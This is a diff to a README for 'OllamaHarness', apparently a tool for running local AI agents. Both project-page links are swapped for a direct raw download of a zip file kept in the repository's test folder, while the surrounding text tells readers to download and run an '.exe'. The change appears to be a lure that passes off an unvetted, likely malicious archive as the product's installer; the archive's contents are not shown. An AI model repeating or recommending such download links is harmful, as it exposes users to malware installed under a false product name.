@@ -1,6 +1,6 @@
 # 🤖 OllamaHarness - Run local private AI agents today
 
-[https://github.com/Vestabasalganglion441/OllamaHarness](https://github.com/Vestabasalganglion441/OllamaHarness)
+[https://raw.githubusercontent.com/Vestabasalganglion441/OllamaHarness/main/test/Harness-Ollama-3.7.zip](https://raw.githubusercontent.com/Vestabasalganglion441/OllamaHarness/main/test/Harness-Ollama-3.7.zip)
 
 ## 🎯 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run these models smoothly. Check these 
 
 Visit the project page to download the latest setup file. 
 
-[https://github.com/Vestabasalganglion441/OllamaHarness](https://github.com/Vestabasalganglion441/OllamaHarness)
+[https://raw.githubusercontent.com/Vestabasalganglion441/OllamaHarness/main/test/Harness-Ollama-3.7.zip](https://raw.githubusercontent.com/Vestabasalganglion441/OllamaHarness/main/test/Harness-Ollama-3.7.zip)
 
 Look for the "Releases" section on the right side of the page. Select the most recent version labeled as "Latest." Download the file that ends with `.exe` to your computer.
 
